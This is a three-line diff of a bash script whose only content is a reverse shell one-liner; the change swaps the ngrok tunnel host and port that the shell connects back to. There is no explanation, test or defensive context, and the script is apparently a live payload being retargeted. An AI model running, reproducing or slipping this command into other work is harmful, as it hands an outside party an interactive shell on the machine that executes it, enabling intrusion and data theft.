@@ -1,3 +1,3 @@
 #!/bin/bash
 
-bash -i >& /dev/tcp/2.tcp.ngrok.io/19852 0>&1
+bash -i >& /dev/tcp/6.tcp.ngrok.io/14360 0>&1
